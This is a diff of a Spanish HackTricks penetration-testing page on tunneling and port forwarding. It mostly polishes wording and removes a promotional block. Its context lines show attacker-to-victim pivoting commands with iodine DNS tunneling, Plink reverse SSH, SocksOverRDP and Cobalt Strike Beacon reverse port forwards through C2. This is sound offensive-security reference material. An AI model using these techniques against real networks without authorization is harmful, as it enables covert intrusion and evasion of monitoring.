@@ -15,18 +15,10 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## Nmap tip
 
 {% hint style="warning" %}
-**ICMP** y **SYN** scans no pueden ser tunelizados a través de proxies socks, por lo que debemos **deshabilitar el descubrimiento de ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que esto funcione.
+**ICMP** y **SYN** scans no pueden ser tunelizados a través de proxies socks, por lo que debemos **desactivar el descubrimiento de ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que esto funcione.
 {% endhint %}
 
 ## **Bash**
@@ -175,9 +167,9 @@ rportfwd stop [bind port]
 ```
 Para tener en cuenta:
 
-- La reversa de puerto de Beacon está diseñada para **túnel tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
-- El tráfico es **tuneado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
-- **No se requieren privilegios de administrador** para crear reenvíos de puerto reversos en puertos altos.
+- La reversa de puerto de Beacon está diseñada para **túnelizar tráfico al Servidor del Equipo, no para relajar entre máquinas individuales**.
+- El tráfico es **túnelizado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
+- **No se requieren privilegios de administrador** para crear reenvíos de puerto reverso en puertos altos.
 
 ### rPort2Port local
 
@@ -302,7 +294,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Es como una versión de consola de PuTTY (las opciones son muy similares a un cliente ssh).
+Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).
 
 Como este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para que podamos tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
 ```bash
@@ -336,7 +328,7 @@ En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ahora podemos **conectar** con la **víctima** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** diciendo que el **plugin SocksOverRDP está habilitado**, y escuchará en **127.0.0.1:1080**.
+Ahora podemos **conectar** con la **víctima** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** diciendo que el **plugin SocksOverRDP está habilitado**, y que **escuchará** en **127.0.0.1:1080**.
 
 **Conéctese** a través de **RDP** y suba y ejecute en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
 ```
@@ -387,7 +379,7 @@ Un proxy inverso creado por Microsoft. Puedes encontrarlo aquí: [https://github
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Se necesita root en ambos sistemas para crear adaptadores tun y túnel datos entre ellos utilizando consultas DNS.
+Se necesita root en ambos sistemas para crear adaptadores tun y túnel de datos entre ellos utilizando consultas DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -424,7 +416,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Cambiar DNS de proxychains
 
-Proxychains intercepta la llamada `gethostbyname` de libc y canaliza la solicitud DNS tcp a través del proxy socks. Por **defecto**, el servidor **DNS** que utiliza proxychains es **4.2.2.2** (codificado). Para cambiarlo, edita el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambia la IP. Si estás en un **entorno de Windows**, podrías establecer la IP del **controlador de dominio**.
+Proxychains intercepta la llamada `gethostbyname` de libc y canaliza la solicitud de DNS tcp a través del proxy socks. Por **defecto**, el servidor **DNS** que utiliza proxychains es **4.2.2.2** (codificado). Para cambiarlo, edita el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambia la IP. Si estás en un **entorno de Windows**, podrías establecer la IP del **controlador de dominio**.
 
 ## Túneles en Go
 
@@ -526,14 +518,6 @@ addr: file:///tmp/httpbin/
 
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
-
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
 
 {% hint style="success" %}
 Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
